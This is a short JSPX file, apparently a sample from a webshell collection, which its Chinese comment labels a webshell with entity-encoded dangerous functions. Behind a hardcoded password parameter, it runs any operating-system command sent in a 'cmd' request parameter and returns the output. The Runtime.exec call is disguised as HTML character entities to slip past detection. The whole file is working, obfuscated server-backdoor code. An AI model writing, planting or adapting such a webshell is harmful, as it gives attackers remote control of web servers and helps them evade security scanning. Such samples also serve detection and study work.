<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="2.0">
    <!--对危险函数进行HTML实体编码的webshell-->
    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
    <jsp:directive.page import="java.io.InputStream"/>
    <pre>
    <jsp:scriptlet>
        if ("shaqima".equals(request.getParameter("ladypwd"))) {
            &#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x2e;&#x73;&#x70;&#x6c;&#x69;&#x74;&#x28;&#x22;&#x20;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;
            int ret = -1;
            byte[] bs = new byte[2048];
            while((ret = in.read(bs)) != -1) {
                out.println(new String(bs));
            }
        }
    </jsp:scriptlet>
    </pre>
</jsp:root>
